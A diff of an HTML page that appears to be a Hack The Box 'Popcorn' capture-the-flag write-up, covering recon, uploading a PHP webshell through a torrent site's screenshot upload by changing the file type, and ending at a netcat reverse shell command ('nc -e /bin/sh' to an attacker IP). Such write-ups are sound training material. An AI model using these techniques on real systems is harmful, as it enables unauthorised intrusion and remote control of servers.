@@ -33,7 +33,7 @@
           </div>
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
-<p><img src="/_resources/f158396b71c742a2b688347b1f4cad67.png" /></p>
+<p><img src=":/f158396b71c742a2b688347b1f4cad67" alt="6afc08b7de8617363e46723f93028018.png" /></p>
 <div><pre class="hljs"><code>└──╼ $whatweb http://popcorn.htb/
 http://popcorn.htb/ <span class="hljs-comment">[200 OK]</span> Apache<span class="hljs-comment">[2.2.12]</span>, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[Apache/2.2.12 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.161.86]</span></code></pre></div>
 <div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">161.86</span>
@@ -46,23 +46,23 @@ PORT   STATE SERVICE VERSION
 |_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//popcorn.htb/
 |_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.2</span>.<span class="hljs-number">12</span> (Ubuntu)
 Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">Host:</span> popcorn.hackthebox.gr; <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel</code></pre></div>
-<p><img src="/_resources/b1aa6dcb60ed440bb44e390d6f7b0377.png" /></p>
+<p><img src=":/b1aa6dcb60ed440bb44e390d6f7b0377" alt="f7e2e7f91c1be951f2b234ff8a564578.png" /></p>
 <p>In <code>/test.php</code> we can see all of the configs of the server, screen has just the beginning.</p>
-<p><img src="/_resources/bfdd0f237f5b496aae5b654c27d784ff.png" /></p>
+<p><img src=":/bfdd0f237f5b496aae5b654c27d784ff" alt="feda7a57f06704204b5e4522ef637766.png" /></p>
 <p><code>/torrent</code> get’s us Torrent Hoster for 2007.</p>
-<p><img src="/_resources/1cba87beeb384e21ab72c4d698ce7c77.png" /></p>
+<p><img src=":/1cba87beeb384e21ab72c4d698ce7c77" alt="f53966f17a3c46fba64e74c3ce7174a8.png" /></p>
 <p>The upload button immidietly got my attention. To access this panel we have to create an account, but creating them is not locked, so it’s not a problem.</p>
-<p><img src="/_resources/6eeefa3d8ba3458f96af14c29a7dee63.png" /></p>
+<p><img src=":/6eeefa3d8ba3458f96af14c29a7dee63" alt="2eef20216a595f444cdc3f4477f8f8c9.png" /></p>
 <p>We can upload a .torrent file and make it accessible to others. I tried to edit the data being sent, but my php webshell was not considered a valid torrent file for some reason.</p>
-<p><img src="/_resources/7e2441f7cb664850a558e93345650494.png" /></p>
-<p><img src="/_resources/8cf3a028907046e088add06af7d9a902.png" /></p>
+<p><img src=":/7e2441f7cb664850a558e93345650494" alt="fc2221cd55b021bf87ee7fa9cee77181.png" /></p>
+<p><img src=":/8cf3a028907046e088add06af7d9a902" alt="afca029c90be98ca4d496422f7c1fa8a.png" /></p>
 <p>Pressing <code>Edit torrent</code> get’s us a new window.</p>
-<p><img src="/_resources/67c86cf98bde45a9802ab8ff0acdf234.png" /></p>
+<p><img src=":/67c86cf98bde45a9802ab8ff0acdf234" alt="da73674866d290f953ebc1eb1740a56f.png" /></p>
 <p>We can get a cool cat for our cool linux distro. Now let’s get even cooler webshell. First I tried changing both content type and file type. Got Invalid file. Then, just file type. Got Invalid file. Lastly…</p>
-<p><img src="/_resources/d94e04f47bd54ee09e54e473aea55b42.png" /></p>
+<p><img src=":/d94e04f47bd54ee09e54e473aea55b42" alt="5f5360111bf8e3779256fd2e8f6da53d.png" /></p>
 <p>Looking at a webshell is not considered a nice image on this site, but we can right click it and open in a new tab to see it in its full glory.</p>
-<p><img src="/_resources/8d667eeed7d940da950d9bdfcff8bd55.png" /></p>
-<p><img src="/_resources/74fb86eaf0ce4fdb8a7e898c9ecaeae5.png" /></p>
+<p><img src=":/8d667eeed7d940da950d9bdfcff8bd55" alt="bfccc9fbc9615bc0d9864da5c3dc316f.png" /></p>
+<p><img src=":/74fb86eaf0ce4fdb8a7e898c9ecaeae5" alt="49fd3cb0e4eab67bf6010191a92aefe1.png" /></p>
 <p>Running <code>ls /home</code> gets us home folder for <strong>george</strong>. Unfortunetly he does not have .ssh file in his directory, so we have to run reverse shell.</p>
 <div><pre class="hljs"><code><span class="hljs-comment"># on victim</span>
 <span class="hljs-attribute">nc</span> -e /bin/sh <span class="hljs-number">10.10.16.30</span> <span class="hljs-number">4444</span>
